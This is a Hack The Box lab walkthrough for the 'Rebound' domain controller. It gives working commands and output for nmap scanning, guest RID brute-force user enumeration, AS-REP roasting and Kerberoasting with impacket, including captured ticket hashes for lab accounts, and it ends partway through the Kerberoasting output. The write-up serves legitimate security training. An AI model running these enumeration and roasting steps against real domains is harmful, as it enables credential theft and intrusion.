---

categories:
- Hackthebox
image:
  path: rebound.png
layout: post
media_subpath: /assets/images/rebound
tags:
- hackthebox
- writeup
- windows
- active-directory
- insane
- kerberos
- asreproast
- kerberoast
- shadow-credentials
- resource-based-constrained-delegation
- cross-session-relay
- gmsa
- bloodhound
- rbcd
- dcsync
title: HTB - Rebound Walkthrough
---


## Introduction
Rebound is an "Insane" difficulty Windows domain controller that demonstrates numerous advanced Active Directory attack techniques. The box requires understanding of Kerberos authentication, service principal names (SPNs), delegation types, cross-session relay attacks, and Group Managed Service Accounts (gMSA). This writeup provides detailed explanations of each concept as they appear in the attack chain.
## Technical Concepts Reference
Before diving in, here's a quick reference of key AD concepts we'll encounter:

| Concept | Description |
|---------|-------------|
| **SPN** | Service Principal Name - unique identifier for a service instance |
| **AS-REP Roasting** | Attack on users without Kerberos pre-authentication |
| **Kerberoasting** | Requesting service tickets to crack service account passwords |
| **Shadow Credentials** | Adding alternate credentials to an account for authentication |
| **RBCD** | Resource-Based Constrained Delegation - allows a resource to specify who can delegate to it |
| **gMSA** | Group Managed Service Account - computer-managed service accounts with automatic password rotation |
| **Cross-Session Relay** | Relaying authentication from one user session to another |
| **DCSync** | Simulating domain controller to replicate password hashes |

## Reconnaissance
### Port Scanning
Initial `nmap` scan reveals a domain controller with standard AD services:

```
nmap -sCV -oA nmap/Rebound 10.129.232.31
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 11:08 +0300
Nmap scan report for 10.129.232.31
Host is up (0.19s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-25 15:09:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-25T15:10:10+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-25T15:10:11+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-02-25T15:10:10+00:00; +7h00m05s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
|_ssl-date: 2026-02-25T15:10:11+00:00; +7h00m05s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m04s, deviation: 0s, median: 7h00m04s
| smb2-time: 
|   date: 2026-02-25T15:10:02
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.30 seconds
```

**Key Findings:**
- Domain: `rebound.htb`
- Domain Controller: `dc01.rebound.htb`
- WinRM enabled on port 5985
Add domain to hosts file:

```
echo '10.129.232.31  dc01.rebound.htb rebound.htb dc01' | sudo tee -a /etc/hosts
```

### SMB Enumeration

Guest account has read access to a non-default share:

```
nxc smb rebound.htb -u 'guest' -p '' --shares                                                                                                                                                                      SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\guest: 
SMB         10.129.232.31   445    DC01             [*] Enumerated shares
SMB         10.129.232.31   445    DC01             Share           Permissions     Remark
SMB         10.129.232.31   445    DC01             -----           -----------     ------
SMB         10.129.232.31   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.31   445    DC01             C$                              Default share
SMB         10.129.232.31   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.31   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.232.31   445    DC01             Shared          READ            
SMB         10.129.232.31   445    DC01             SYSVOL                          Logon server share 
```

The share is empty, but user enumeration reveals more:

```
nxc smb rebound.htb -u 'guest' -p '' --rid-brute                  
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\guest: 
SMB         10.129.232.31   445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.129.232.31   445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.129.232.31   445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.129.232.31   445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         10.129.232.31   445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         10.129.232.31   445    DC01             515: rebound\Domain Computers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
SMB         10.129.232.31   445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.232.31   445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             525: rebound\Protected Users (SidTypeGroup)
SMB         10.129.232.31   445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.232.31   445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.232.31   445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.232.31   445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         10.129.232.31   445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         10.129.232.31   445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.232.31   445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         10.129.232.31   445    DC01             2952: rebound\llune (SidTypeUser)
SMB         10.129.232.31   445    DC01             3382: rebound\fflock (SidTypeUser)
```

**Technical Concept: RID Brute-Forcing**
- **RID (Relative Identifier)**: The last part of a SID that identifies a user/group
- Default RIDs: 500 (Administrator), 501 (Guest), 502 (krbtgt)
- RID brute-forcing enumerates all objects by cycling through RID values
- Default max in tools is often 4000; increasing to 10000 revealed additional users

**Users discovered beyond default range:**

```
nxc smb rebound.htb -u 'guest' -p '' --rid-brute 10000
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\guest: 
SMB         10.129.232.31   445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.129.232.31   445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.129.232.31   445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.129.232.31   445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         10.129.232.31   445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         10.129.232.31   445    DC01             515: rebound\Domain Computers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
SMB         10.129.232.31   445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.232.31   445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             525: rebound\Protected Users (SidTypeGroup)
SMB         10.129.232.31   445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.232.31   445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.232.31   445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.232.31   445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         10.129.232.31   445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         10.129.232.31   445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.232.31   445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         10.129.232.31   445    DC01             2952: rebound\llune (SidTypeUser)
SMB         10.129.232.31   445    DC01             3382: rebound\fflock (SidTypeUser)
SMB         10.129.232.31   445    DC01             5277: rebound\jjones (SidTypeUser)
SMB         10.129.232.31   445    DC01             5569: rebound\mmalone (SidTypeUser)
SMB         10.129.232.31   445    DC01             5680: rebound\nnoon (SidTypeUser)
SMB         10.129.232.31   445    DC01             7681: rebound\ldap_monitor (SidTypeUser)
SMB         10.129.232.31   445    DC01             7682: rebound\oorend (SidTypeUser)
SMB         10.129.232.31   445    DC01             7683: rebound\ServiceMgmt (SidTypeGroup)
SMB         10.129.232.31   445    DC01             7684: rebound\winrm_svc (SidTypeUser)
SMB         10.129.232.31   445    DC01             7685: rebound\batch_runner (SidTypeUser)
SMB         10.129.232.31   445    DC01             7686: rebound\tbrady (SidTypeUser)
SMB         10.129.232.31   445    DC01             7687: rebound\delegator$ (SidTypeUser)
```


## Initial Access - Kerberos Attacks
### Technical Concept: AS-REP Roasting

**How Kerberos Pre-Authentication Works:**
1. User requests a TGT (Ticket Granting Ticket) from KDC
2. Normally: User encrypts timestamp with their password hash
3. KDC decrypts to verify identity
4. **Without Pre-Authentication**: KDC issues TGT without verification

**AS-REP Roasting**: If a user has `UF_DONT_REQUIRE_PREAUTH` set, attackers can request a TGT for them without knowing their password. The KDC responds with an encrypted TGT that can be cracked offline.

Testing users for AS-REP roastability:

```
impacket-GetNPUsers 'rebound.htb/' -no-pass -dc-ip 10.129.232.31 -usersfile files/users.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:f66b4073d2b91ad8221b2011d49733bf$ca3485c436ea57a77dbaa3908c692a62366ab7d68da27802868db9b731829815717d7a922e7c6f5ac69ddb880771d917d2789ef9b32b54024bb9f8320566d53c7e2441eb188b7ada9402aee7f21672b7e42d372201b617ea966f7c29d2681e90702d1a4ddae816eb272584a18ddcb630594ad18968dd0a72a9d7c696c199f10c12c555220e7a21c614f733b7db14ab39f2c00f9c54cc6066246b3e0b2a02af4a8a55bac4f70cfcf300fcea07090d253d74b1fea05262f673aac4d4b4ba594d14c5f082a107ce29a87331d0c69317633da4ecc3ef43cba68e7cb8de1d7563c0c43a82ffbfe03e119cab38
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Result**: `jjones` is vulnerable - hash obtained but didn't crack.

### Technical Concept: Kerberoasting & Clock Skew

**Kerberos Service Tickets**: When a user wants to access a service, they request a service ticket (TGS) from the KDC. The ticket is encrypted with the **service account's** password hash.

**Kerberoasting**: Attackers can request service tickets for any account with an SPN and crack them offline.

**Clock Skew Issue**:

```
impacket-GetUserSPNs 'rebound.htb/guest:'  -usersfile files/users.txt -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**Technical Explanation**: Kerberos is time-sensitive - tickets include timestamps to prevent replay attacks. If client and server time differ by more than 5 minutes (default), authentication fails.

**Solution**:

```
sudo ntpdate rebound.htb 
2026-02-25 18:37:49.492861 (+0300) +25204.810891 +/- 0.099747 rebound.htb 10.129.232.31 s1 no-leap
CLOCK: time stepped by 25204.810891

```

### Successful Kerberoasting
After fixing clock skew, multiple service tickets are obtained:

```
impacket-GetUserSPNs 'rebound.htb/guest:'  -usersfile files/users.txt -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] Principal: guest: - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Enterprise - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$bc9b7a9e327a14769592f91a$676495954a8801674a0fd9f755f7f3a71f39ce811f7d8508c38254e35c016f8de8c6dd2cbb9209ee2fff752eaeae4717424e54977c9abee98fdc5e5029b56c17fb25c0a5e7c347d6cab7428f14f0e13a564a5f0c27a2b75dd81b980da221b5ce340bba1c13fc53306d394318a76e9b8a1916a4468b70918d4e1e0eb78215f3a167d16e22ffab933d0d77172d2aa015ee209a40725c84f18e41644759d061e16b84dce733813a7ea8f0d7cf00576e6d904c1e658c9d7ac441b95ec653c7b03565dd63ac863bd19029020d04f72d6f3970a93b1493626d5f3ff22bb5778c349b5c99dec89be89fee0db7aa532b37d7f05aa876b6cd5da573a81d1f7c7dd03ae88bbded60d4be7441d79ea4d7f55ad223a51464047b131a0d46b89b38e94c2547157c4fdf0bd02e7b49285ea6f9d0912d3ea932399f50e97b18601e7607a9a99cc401baa2a765311eaf562f9534e9946da455670195b78d1c58a285974b1c7d485ea910954e2de72d3aae609e39af0b6e0719be4fce4011fac436ab74651e3d7bfebc9e8c1dfa72ed6fc117738d54f608b2701da95c449c9c934601af974ecd7ae7ada6886272605457303b04f0e18f4548820ecf6e1791c9c2160bb481f3aca69242aa5aa03320e00d3a8e19e380970ffc45d961406975cab3fb3cd3601d02dcaf717287197a267684d08f9a8e27784f96df06c2e349bd0e5d06d76708a228baa3113377182e1ce3a82db08340e65ade468d67b781d0bcfa04be6c0ad106310c3dee472f7b8365befb974705e3c18aec966c3d1454312effb3760ea3c99f676f0ed7162b89a1a1e42d2caa2c55d6ca17ecefa2ec6925ef79b3e07f7cfc3d1f5dae58f99b26c2778573f489ca781ad48593ef7b0d2074a7ad3c0da5853c092d935fb23d2b699fab66d8b3b7bbfd531fe28a77f761b40e30fab6a2879e959b5a0b19851188e66b72eabac146b9173dcf6c30ffe4279feb1c1eee05937d29942733bac1311edc7c3560adfe4fe8381fd1767c3797122e32d9b0403341ea69c7edae3282531a222a896042bec531c99cf5cac7e652b9e20c9922a4f01a680a44bfcb83c4567ad460b1f3da0ce5d6f470def447d1040007754491c2f50f7cff7a7204b730378c855784539c08b42c8627e7e56eb58b766a9fd01408460521df848aacc16d3f6e551932244f5f628f96bd3a4fd45eb80ede41a5a99869c202501af8271977531414e15a64d92b49aa6d73f6dce6a1cb4f18cec0e3ecbb5b64369f78baefecff80c7d849e6104fab5639fb2c2b4a855bd198724241c9bc480186de80a799789a987789501d5306526f554f5f970d1aca121e4184354320c6f9235c90e03ddf816a128fcae7a8f92c9a63ae32a9857716457d5d583a7708c04ddfa0ce4736410172b8fa6cd106030912b4d73f162837ebc56cd0803c695f22f1b40071e469ab
[-] Principal: Domain - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Domain - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Domain - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Domain - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Domain - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Cert - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Schema - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Enterprise - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Group - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Read-only - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Cloneable - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Protected - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Key - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Enterprise - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: RAS - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Allowed - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: Denied - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$357d27c9c1ad964fe16b5b60$66f6b6be3d72dd96831f7a9e5656e58210cba813232381ff3dac68f16788ec3376739868156a9153993bcd808d9377c2563c77e4ef6c132ba93c945bad9bbcbfa0a407f0cf15a1b2c53a9ca84e70dcd5fe28b3bb8f717c617661e4eb7417264f619acd59d2de5c4118d7b97e80342c63c0c51fa08fad04fee1e5ef58e3fc42bdccb2ef7ae7cbc707c79c726cec38051274c42815acb379b278bedf74f124365d18d9264b3734ffbeeaaf07e724575e738c5deb54b905cee271a41ad03e05676f251372d050a3a30e9c57744b023870db1bd5a5e92ad1c0ab21169362b26350c3b42b44f93ebd8c50a46ba7ff418800768932075b974c47cff30ac7ce4aa08be61b225fbf1a57b9eef3b21d4a92680b116040102ed0c8ca2f002c85e4a331dcbd09b9446068151fba8700197e2f84f74634937a385f3980ba1e46f25afbd0258c64efe61693d0ecd1fd65d228c5feecbd415ebd87c906974f7e0d090f6fdc012552b1c9995afd2b9323efe469edf564781a7c3067604e77ee6ba8f32bc43a4830aae06c8cbdaa6deed8bb6a7de5564803adb9834f6d98a09629ae5e0e7a534a71cf128ca0aba07f8bee1a77fc074a35bcc8ab866c673d89bd458e6041af41223fd5e9b3a3ab7a852a2b9391cfda3a9b312fa737db0e60ceac53a631f1bbbcefa9a4c26a7549895b544f27ae18d122444bc82c9c0fe297a3d82e92e2975d7fe5fa95fd82b4e061d4cbaafc7e30bbe74345aa5fdc0b2703face1d86e473c644a097c7aaecfa8370e119d2278957364406aa72af961a5fa562552427c405258baef14c3727ca4dacf45cfa3d637073174f3e147fae72b60651468cb2d747564b71c31a5bc15496a85aaf20dda2cbe95ad90e6d0e8cac764a1bf6bc2aaa477bdbb74e5c04f07cb742c575c13636313eb536bdb7e2651b8218199caa1d68ceaf8686f5fb489c9e0c9c1c552b4a640d43094e9c6c43fdcc20df9ffacbf0d093021594b241fa5dd5c20a21e1e7dde25718e750fafdf91e66d4de45bd7944d07f8ad96da410d07d55419acdf1347c55421420477705a2c45f4612dae823ef3eb96511c3e5d4ea6e0953f155f3fc515fe746a251774783aea28dc6438a672cfd0d7e32b4f495c5b2818198cf3b8187df5a6ca165a74b630228a7114134b3476b668cc14251b33d2416b60c7f1dd79dbb052c01727f685777f65c095eef11ef1c7289d3e70818d07ae21d913dec7eb42b7c76459bbe36a66602f414301de4f5b8aa25576753be7b207e4d899a4df212232a72c305c5f8c2b92cbef518034057dc75e47033e127c97c6999f2115c8cfbef03896e12e2af0163f5b347514f8b4ae085738a68df43f0296a53ca10b81fdeeb0d2e0fbef648d323f2bf2830663c9fb2d12372d24e1774470b900987c32041207192f5b1b40c690e4eb1238fafdb
[-] Principal: DnsAdmins - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: DnsUpdateProxy - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$66bf9a129edd6489f69635dc505d98d3$28e3fc2bb2a3cf073a12a517fad8acd3dcd0e342d228b40f2402c4d144b48a27c95a18cd8118a90cca96c5a4de2f8c2930b43f9359944ee8d6e679de2331e970194c9e0b7e78cd1b816c3faa90ff9e1b024182b283323da1909cc49ed50ea388d46a3e7b521635b3f9f568477797a36162b146e50125ef585b3ac19c87d9ea1f7502ab272be8d8fa0d77a8cdc806e4fdf06bce4a8fa954ee4253c84ce2a5e7475e9a7ad21e6861f0f190accb6d674107e1cddb205b968a3e432c5f0728b8c0e78f6639e2e06bcd0073fb31db2a9bb8672296e70d20ecd46e453711a4fe3e36f80a8bda2eb8db1fa7cae0adef8c104521a33a8e7deb15ac37fd70e03a25bc01d1d74bbbe3dd32b3281dee95507186345a07243cbe230303909c2f646c24df80605e6c81d8773cbd21c5a07fa4b8a6e11272661fcb394dc1ad45d904a5b73244a030be27062c11e07967ab807e6f02d93b44ce4772bd6b692b87ca9ee461184976e38c774d23031ecfd29923032d2cfdfe770f2c076cf3006f20cf8bc54c0a56a846eb9f21b636280c2db577afdb57c003e214d98d5b3b0a126e113cd93ac41ec7216b69b4b2a5aa8301b1f1268d6e493b64c6892203b2f522c3b60a3e4230b9b83d6afcb8a0b83aa786bff34705fc3cb4052778b681c4d769b897320c61eb8c637f119bce5662458f9873ee0d561c01b5e9ca7ce74c92b8e928ac36c389e7609c518a3888844fb862808f25175f5ea725f36cb843d7ac1300aeecbeb5e3cd46bb17313af6af1281afda917a4e819ffb4ba883a153c3f7c3e9c2dd86896a7e34461925430f9a6b62ef060e1ab5014d8de20b900faef09a22f2ec2f338a10384234c88eb10981c6f45b1485529ac208fa0fdcabea2ff352c6ecfbb983d7e2566b4ec630964c2981023e2bda2ced9421a3d0796773913c7c64fcfd39ceaa22c0e8771a7e1fbe788d6a8752590d45511f30f05c95b9a86c13b1f76b359bd1256c051de30c8fb1ad9bfe08976a216e0f8a1304f15147aae3e6d64b65140b2a3ac213da8c7890625cfeb3cd4bbebbbe8756099bf3a51771303de2ac04c75f24e13c24c5e3f3c7a533e5df5732360ed45f59e4c5551e621b54b72aa4d02376682192cc5e0bcc824a6575d2ec0dbd2d95b4397ae3b61e0d4ad286dce93fb696a33d69423d242abcd7044e24d4cb452679f5daaf30ec30ea77bee80a9fbc4384a9ca1994dddf8dfa866f8102879c718094e12018e1794720fcce84406757133762876813b9b3702809194f566e653d7df6d9ba248e850fa8a00d8d6a9378eacc68a34db38d2bbd69b1ce0fb74e71812fc5394488ff9496a963bba09c583b62ef5d14fa66e86cd765827e72dec7287f67c87a7c2464c3095a44d35c417f5f154fefc8e313bd59584197d35c03dca534fd935255243fc13c824c8d3f2cc598
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: ServiceMgmt - Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
